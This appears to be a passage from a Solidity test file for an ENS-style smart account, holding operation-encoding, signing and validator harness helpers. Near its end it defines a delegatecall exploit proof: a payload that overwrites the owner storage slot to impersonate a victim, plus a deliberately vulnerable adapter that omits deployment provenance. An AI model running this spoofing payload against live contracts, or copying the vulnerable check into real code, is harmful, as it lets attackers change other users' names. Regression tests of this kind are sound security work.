    function _resolverAddress(VerifiableFactory factory, address deployer, uint256 salt)
        internal
        view
        returns (address)
    {
        bytes32 outerSalt = keccak256(abi.encode(deployer, salt));
        return
            Create2.computeAddress(
                outerSalt,
                keccak256(CloneProxyBytecode.creationCode(factory.proxyLogic(), outerSalt)),
                address(factory)
            );
    }

    function _registrationOperationData(address registrant, address registrationResolver)
        internal
        view
        returns (bytes memory)
    {
        return
            _registrationOperationDataWithDefaultReverseName(
                registrant,
                registrationResolver,
                "alice.eth"
            );
    }

    function _registrationWithResolverDeployment(
        address implementation,
        uint256 salt,
        bytes memory initData
    )
        internal
        view
        returns (bytes memory)
    {
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: verifiableFactory, value: 0, callData: _resolverDeploymentCall(
            implementation,
            salt,
            initData
        )});
        executions[1] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            counterfactualResolver
        )});
        return _operationData(executions);
    }

    function _resolverDeploymentCall(address implementation, uint256 salt, bytes memory initData)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodeWithSelector(DEPLOY_PROXY_SELECTOR, implementation, salt, initData);
    }

    function _defaultGrants() internal view returns (Grant[] memory grants) {
        grants = new Grant[](2);
        grants[0] = Grant({account: address(hca), roleBitmap: EACBaseRolesLib.ALL_ROLES});
        grants[1] = Grant({account: owner, roleBitmap: EACBaseRolesLib.ALL_ROLES});
    }

    function _registrationOperationDataWithDefaultReverseName(
        address registrant,
        address registrationResolver,
        string memory defaultReverseName
    )
        internal
        view
        returns (bytes memory)
    {
        bytes[] memory resolverCalls = new bytes[](2);
        resolverCalls[0] = abi.encodeCall(ITextSetter.setText, (NAME, "avatar", "ipfs://avatar"));
        resolverCalls[1] = abi.encodeCall(INameSetter.setName, (NAME, "alice.eth"));

        Execution[] memory executions = new Execution[](5);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            registrant,
            registrationResolver
        )});
        executions[1] = Execution({target: registrationResolver, value: 0, callData: abi.encodeCall(
            IAddressSetter.setAddress,
            (NAME, COIN_TYPE_ETH, abi.encodePacked(registrant))
        )});
        executions[2] = Execution({target: registrationResolver, value: 0, callData: abi.encodeCall(
            IMulticallable.multicall,
            (resolverCalls)
        )});
        executions[3] = Execution({target: usdc, value: 0, callData: abi.encodeWithSelector(
            APPROVE_SELECTOR,
            ethRegistrar,
            1 ether
        )});
        executions[4] = Execution({target: defaultReverseRegistrarHCAAdapter, value: 0, callData: abi.encodeWithSelector(
            SET_NAME_WITH_HCA_SELECTOR,
            registrant,
            defaultReverseName
        )});

        return _operationData(executions);
    }

    function _registerCallData(address registrant, address registrationResolver)
        internal
        view
        returns (bytes memory)
    {
        return _registerCallDataForLabel("alice", registrant, registrationResolver);
    }

    function _registerCallDataForLabel(
        string memory label,
        address registrant,
        address registrationResolver
    )
        internal
        view
        returns (bytes memory)
    {
        return
            abi.encodeWithSelector(
                REGISTER_SELECTOR,
                label,
                registrant,
                bytes32("secret"),
                subregistry,
                registrationResolver,
                uint64(365 days),
                usdc,
                bytes32(0)
            );
    }

    function _commitOperationData() internal view returns (bytes memory) {
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: abi.encodeWithSelector(
            COMMIT_SELECTOR,
            bytes32("commitment")
        )});
        return _operationData(executions);
    }

    function _singleOperationData(address target, uint256 value, bytes memory callData)
        internal
        pure
        returns (bytes memory)
    {
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: target, value: value, callData: callData});
        return _operationData(executions);
    }

    function _operationData(Execution[] memory executions) internal pure returns (bytes memory) {
        return _packOperation(HCAOperationHashLib.ERC7579_EMISSARY_EXECUTION_MODE, executions);
    }

    function _erc1271OperationData(Execution[] memory executions)
        internal
        pure
        returns (bytes memory)
    {
        return _packOperation(HCAOperationHashLib.ERC7579_ERC1271_MODE, executions);
    }

    function _packOperation(bytes32 mode, Execution[] memory executions)
        internal
        pure
        returns (bytes memory packed)
    {
        packed = abi.encodePacked(bytes2(mode), uint8(executions.length));
        for (uint256 i; i < executions.length; ++i) {
            Execution memory execution = executions[i];
            require(execution.value == 0, "nonzero execution value");
            require(execution.callData.length <= type(uint24).max, "execution calldata too large");
            packed = bytes.concat(
                packed,
                abi.encodePacked(
                    execution.target,
                    uint24(execution.callData.length),
                    execution.callData
                )
            );
        }
    }

    function _erc1271CommitOperationData() internal view returns (bytes memory) {
        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: abi.encodeWithSelector(
            COMMIT_SELECTOR,
            bytes32("commitment")
        )});
        return _erc1271OperationData(executions);
    }

    function _expectValidationRevert(
        bytes memory operationData,
        address allowedResolver,
        bytes4 selector
    )
        internal
    {
        if (selector == HCAOwnerAndSessionValidator.ActionNotAllowed.selector) {
            vm.expectPartialRevert(selector);
        } else {
            vm.expectRevert(selector);
        }
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            allowedResolver,
            operationData
        );
    }

    function _sessionUse(bytes32 permissionId, uint256 signerKey, bytes32 digest)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodePacked(bytes1(0), permissionId, _signRhinestoneMessage(signerKey, digest));
    }

    function _fixedSessionEnvelope(
        bytes32 permissionId,
        uint256 nonce,
        bytes memory operationData,
        uint256 signerKey,
        bytes32 digest
    )
        internal
        pure
        returns (bytes memory)
    {
        return
            abi.encodePacked(
                bytes1(uint8(1)),
                permissionId,
                nonce,
                operationData,
                _sign(signerKey, digest)
            );
    }

    function _fixedSessionRefundEnvelope(
        bytes32 permissionId,
        uint256 nonce,
        HCAOwnerAndSessionValidator.GasRefund memory gasRefund,
        bytes memory operationData,
        uint256 signerKey,
        bytes32 digest
    )
        internal
        pure
        returns (bytes memory)
    {
        return
            abi.encodePacked(
                bytes1(uint8(2)),
                permissionId,
                nonce,
                gasRefund.token,
                gasRefund.exchangeRate,
                gasRefund.overhead,
                operationData,
                _sign(signerKey, digest)
            );
    }

    function _signRhinestoneMessage(uint256 privateKey, bytes32 digest)
        internal
        pure
        returns (bytes memory)
    {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, _toEthSignedMessageHash(digest));
        return abi.encodePacked(r, s, v + 4);
    }

    function _toEthSignedMessageHash(bytes32 digest) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
    }

    function _sign(uint256 privateKey, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function _signPersonal(uint256 privateKey, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, _toEthSignedMessageHash(digest));
        return abi.encodePacked(r, s, v);
    }

    function _signV01(uint256 privateKey, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return abi.encodePacked(r, s, v - 27);
    }
}


/// @title HCA Owner and Session Validator Harness
/// @notice Exposes internal validator helpers for policy-focused tests.
contract HCAOwnerAndSessionValidatorHarness is HCAOwnerAndSessionValidator {
    constructor(
        address defaultReverseRegistrarHCAAdapter,
        address reverseRegistrarHCAAdapter,
        address permittedResolverImpl,
        address ethRegistry,
        address verifiableFactory,
        address intentExecutor,
        address gasRefundPaymaster
    )
        HCAOwnerAndSessionValidator(
            defaultReverseRegistrarHCAAdapter,
            reverseRegistrarHCAAdapter,
            permittedResolverImpl,
            ethRegistry,
            verifiableFactory,
            intentExecutor,
            gasRefundPaymaster
        )
    {}

    function callArgsHarness(bytes memory callData) external pure returns (bytes memory) {
        return HCAExecutionLib.callArgs(callData);
    }

    function isBatchRegistrarPaymentTokenHarness(bytes calldata operationData, address token)
        external
        view
        returns (bool)
    {
        if (operationData.length < 32) {
            return false;
        }
        return
            HCARegistrarPolicyLib.isBatchPaymentToken(
                HCAOperationHashLib.decode(operationData).executions,
                token
            );
    }

    function recoverHarness(bytes32 digest, bytes calldata signature)
        external
        pure
        returns (address)
    {
        address signer = HCASignatureLib.recover(digest, signature);
        if (signer == address(0)) {
            revert InvalidSigner();
        }
        return signer;
    }

    function checkRegistrationPolicyHarness(
        address account,
        address owner,
        address resolver,
        bytes calldata operationData
    )
        external
        view
    {
        if (operationData.length < 3) {
            revert InvalidOperationEncoding();
        }
        HCAOperationHashLib.DecodedOperation memory operation =
            HCAOperationHashLib.decode(operationData);
        if (!HCAOperationHashLib.isSupportedMode(operation.mode)) {
            revert InvalidOperationEncoding();
        }
        _checkRegistrationExecutions(
            account,
            owner,
            resolver,
            operation.executions,
            GasRefund(address(0), 0, 0),
            address(0),
            false
        );
    }

    function checkRegistrationExecutionsHarness(
        address account,
        address owner,
        address resolver,
        Execution[] calldata executions
    )
        external
        view
    {
        _checkRegistrationExecutions(
            account,
            owner,
            resolver,
            executions,
            GasRefund(address(0), 0, 0),
            address(0),
            false
        );
    }

    function checkStatelessRegistrationPolicyHarness(
        address account,
        address owner,
        SessionEnableProof calldata proof,
        bytes calldata operationData,
        GasRefund calldata gasRefund
    )
        external
        view
    {
        (HCAOperationHashLib.DecodedOperation memory operation, ) =
            _decodeERC1271Operation(operationData);
        _checkStatelessRegistrationPolicy(account, owner, proof, operation, gasRefund);
    }

    function checkResolverBindingHarness(address resolver, bool usesResolver, bool deploysResolver)
        external
        view
    {
        _checkResolverBinding(
            resolver,
            RegistrationPolicyState({usesResolver: usesResolver, deploysResolver: deploysResolver, authorizedRegistrar: address(
                0
            )})
        );
    }

    function operationHashHarness(bytes calldata operationData) external pure returns (bytes32) {
        (, bytes32 operationHash) = _decodeERC1271Operation(operationData);
        return operationHash;
    }

    function readUintHarness(bytes memory callData, uint256 offset) external pure returns (uint256) {
        return _readUint(callData, offset);
    }

    function singleChainDigestHarness(address account, uint256 nonce, bytes calldata operationData)
        external
        view
        returns (bytes32)
    {
        (, bytes32 operationHash) = _decodeERC1271Operation(operationData);
        return _singleChainDigest(account, nonce, operationHash, GasRefund(address(0), 0, 0));
    }

    function singleChainDigestWithRefundHarness(
        address account,
        uint256 nonce,
        bytes calldata operationData,
        GasRefund calldata gasRefund
    )
        external
        view
        returns (bytes32)
    {
        (, bytes32 operationHash) = _decodeERC1271Operation(operationData);
        return _singleChainDigest(account, nonce, operationHash, gasRefund);
    }
}


contract StandaloneSingleOwnerHCAHarness is StandaloneSingleOwnerHCA {
    constructor(
        address entryPoint,
        address defaultValidator,
        address defaultExecutor,
        bytes memory validatorInitData,
        IAddressSet upgradeSet,
        IAddressSet predecessorUpgradeSet
    )
        StandaloneSingleOwnerHCA(
            entryPoint,
            defaultValidator,
            defaultExecutor,
            validatorInitData,
            upgradeSet,
            predecessorUpgradeSet,
            IStandaloneHCAFactory(address(0))
        )
    {}

    function authorizeUpgradeHarness(address newImplementation) external view {
        _authorizeUpgrade(newImplementation);
    }
}


interface IUUPSProxyUpgrade {
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}


interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}


interface IERC1155Receiver {
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    )
        external
        returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    )
        external
        returns (bytes4);
}


contract WalletPaidTarget {
    error Failed();

    uint256 public value;

    function setValue(uint256 value_) external {
        value = value_;
    }

    function fail() external pure {
        revert Failed();
    }
}


/// @title Owner Slot Writer
/// @notice Writes the standalone HCA owner slot in the active execution context.
contract OwnerSlotWriter {
    /// @notice Replaces the address stored in slot zero.
    /// @param replacementOwner The address to store.
    function writeOwner(address replacementOwner) external {
        assembly ("memory-safe") {
            sstore(0, replacementOwner)
        }
    }
}


/// @title HCA Primary-Name Adapter Interface
/// @notice Defines the adapter entry point used by the delegatecall exploit proof.
interface ISetNameWithHCA {
    /// @notice Sets an account's primary name through an HCA caller.
    /// @param account The account whose name changes.
    /// @param name The primary name.
    function setNameWithHCA(address account, string calldata name) external;
}


/// @title Owner Spoofing Payload
/// @notice Temporarily replaces the HCA owner while calling a vulnerable reverse adapter.
contract OwnerSpoofingPayload {
    /// @notice Impersonates an unrelated account for one nested adapter call.
    /// @param adapter The vulnerable HCA-aware adapter.
    /// @param victim The unrelated account whose reverse name changes.
    /// @param name The reverse name selected by the HCA owner.
    function spoofOwnerAndSetName(ISetNameWithHCA adapter, address victim, string calldata name)
        external
    {
        address originalOwner;
        assembly ("memory-safe") {
            originalOwner := sload(0)
            sstore(0, victim)
        }
        adapter.setNameWithHCA(victim, name);
        assembly ("memory-safe") {
            sstore(0, originalOwner)
        }
    }
}


/// @title Implementation-Trust-Only Default Adapter
/// @notice Reproduces HCA authorization that omits deployment provenance.
contract ImplementationTrustOnlyDefaultAdapter {
    DefaultReverseRegistrar internal immutable REGISTRAR;
    VerifiableFactory internal immutable VERIFIABLE_FACTORY;
    IAddressSet internal immutable TRUSTED_HCA_SET;

    /// @param registrar The reverse registrar updated by the adapter.
    /// @param verifiableFactory The factory queried for the caller's current implementation.
    /// @param trustedHCASet The implementation allowlist.
    constructor(
        DefaultReverseRegistrar registrar,
        VerifiableFactory verifiableFactory,
        IAddressSet trustedHCASet
    )
    {
        REGISTRAR = registrar;
        VERIFIABLE_FACTORY = verifiableFactory;
        TRUSTED_HCA_SET = trustedHCASet;
    }

    /// @notice Sets a reverse name after performing the vulnerable runtime checks.
    /// @param account The account whose name changes.
    /// @param name The reverse name to set.
    function setNameWithHCA(address account, string calldata name) external {
        address implementation = VERIFIABLE_FACTORY.verifyContract(msg.sender);
        require(TRUSTED_HCA_SET.includes(implementation));
        require(IStandaloneHCAOwner(msg.sender).owner() == account);
        REGISTRAR.setNameForAddr(account, name);
    }
}


/// @title Address Set Approval Interface
/// @notice Exposes the mutation used with production address-set deployments in these tests.
interface IAddressSetApproval is IAddressSet {
    /// @notice Adds or removes an address from the set.
    /// @param addr The address whose membership changes.
    /// @param approved Whether the address is included.
    function approve(address addr, bool approved) external;
}


/// @title Legacy Delegatecall HCA
/// @notice Test-only Nexus account retaining the vulnerable inherited execution paths.
contract LegacyDelegatecallHCA is Nexus {
    /// @notice The initialized owner.
    address public owner;

    /// @notice The fixed-session nonce reported to the validator.
    uint96 public sessionNonce;

    /// @param entryPoint_ ERC-4337 EntryPoint used by Nexus.
    /// @param defaultValidator_ Validator used for owner UserOperations.
    constructor(address entryPoint_, address defaultValidator_)
        Nexus(entryPoint_, defaultValidator_, address(0), "", "")
    {}

    /// @notice Initializes the account owner.
    /// @param initData ABI-encoded owner address.
    function initializeAccount(bytes calldata initData) external payable override {
        owner = abi.decode(initData, (address));
    }

    /// @notice Returns the owner and fixed-session nonce.
    /// @return owner_ The initialized owner.
    /// @return sessionNonce_ The current fixed-session nonce.
    function ownerAndSessionNonce() external view returns (address owner_, uint96 sessionNonce_) {
        return (owner, sessionNonce);
    }
}
